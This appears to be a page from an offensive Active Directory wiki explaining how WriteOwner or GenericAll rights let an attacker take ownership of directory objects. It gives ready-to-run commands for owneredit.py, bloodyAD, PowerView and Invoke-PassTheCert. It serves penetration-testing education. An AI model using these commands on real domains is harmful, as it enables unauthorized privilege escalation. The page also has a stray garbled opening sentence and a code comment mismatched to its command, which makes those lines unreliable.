---
authors: CravateRouge, ShutdownRepo, sckdev, jamarir
category: ad
---

# Grant ownership

t has the following command-line arguments.This abuse can be carried out when controlling an object that has `WriteOwner` or `GenericAll` over any object.

The attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. For instance, the attacker could change the target object's permissions and [grant rights](grant-rights.md).

::: tabs

=== UNIX-like

From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s owneredit.py (Python).

```bash
owneredit.py -action write -new-owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
```


=== Windows

From Windows systems, this can be achieved with [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
```

The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).

> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
```powershell
# Import the PowerShell script and show its manual
Import-Module .\Invoke-PassTheCert.ps1
.\Invoke-PassTheCert.ps1 -?
# Authenticate to LDAP/S
$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
# List all the available actions
Invoke-PassTheCert -a -NoBanner
# Add an object (e.g. WANHADELHEG$) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer (e.g. RBESEEDEE$)
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'controlled_principal_sid' -Target 'CN=Kinda KO. OWNED,CN=Users,DC=X'
```

:::
